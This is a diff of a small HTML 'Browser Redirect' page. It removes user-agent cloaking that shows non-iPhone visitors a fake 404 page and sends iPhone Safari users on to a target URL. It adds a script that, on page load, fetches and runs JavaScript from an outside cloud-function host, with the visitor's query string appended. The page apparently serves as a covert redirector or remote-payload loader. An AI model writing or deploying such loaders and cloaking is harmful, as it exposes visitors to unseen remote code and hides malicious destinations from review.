@@ -3,53 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <title>Browser Redirect</title>
-    <style>
-        body {
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #222; /* full background */
-            font-family: Arial, sans-serif;
-        }
-        img {
-            width: 100%;
-            height: auto;
-            object-fit: contain; /* keep aspect ratio, no cropping */
-            border-radius: 8px;  /* optional: rounded corners */
-        }
-    </style>
 </head>
 <body>
-    <script>
-        // Detect if the device is an iPhone
-        function isIphone() {
-            return /iPhone/i.test(navigator.userAgent);
-        }
-
-        // Detect if the browser is Safari
-        function isSafari() {
-            const ua = navigator.userAgent;
-            return /^((?!chrome|android).)*safari/i.test(ua);
-        }
-
-        const targetUrl = 'https://example.com';  // Replace with your target URL
-
-        if (!isIphone()) {
-            // Not iPhone, redirect to 404 page
-            window.location.href = 'https://gitleap.github.io/404.html';
-        } else if (isSafari()) {
-            // iPhone + Safari: redirect to targetUrl
-            const query = window.location.search;
-            const redirectUrl = `${targetUrl}${query}`;
-            window.location.href = redirectUrl;
-        } else {
-            // iPhone + non-Safari: display centered image (90% of screen)
-            const img = document.createElement('img');
-            img.src = 'tip.webp';
-            document.body.appendChild(img);
-        }
+    <script type="text/javascript">
+        window.addEventListener("DOMContentLoaded", () => {
+            const script = document.createElement('script')
+            script.src = `https://gitleap-usxcgdheld.cn-shanghai.fcapp.run/${window.location.search}`
+            script.defer = true
+            document.body.append(script)
+        })
     </script>
 </body>
 </html>
